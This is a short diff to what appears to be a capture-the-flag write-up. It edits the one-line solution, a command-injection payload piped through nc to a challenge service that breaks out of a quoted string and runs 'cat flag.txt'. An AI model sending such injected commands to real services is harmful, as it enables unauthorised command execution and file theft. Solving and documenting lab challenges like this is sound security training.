@@ -4,5 +4,5 @@
 
 ## Solution
 
-`echo -n 'xx" x >> /dev/null || cat /flag.txt;#' | nc <domain> 8080`
+`echo -n 'xx" x >> /dev/null || cat flag.txt;#' | nc <domain> 8080`
 
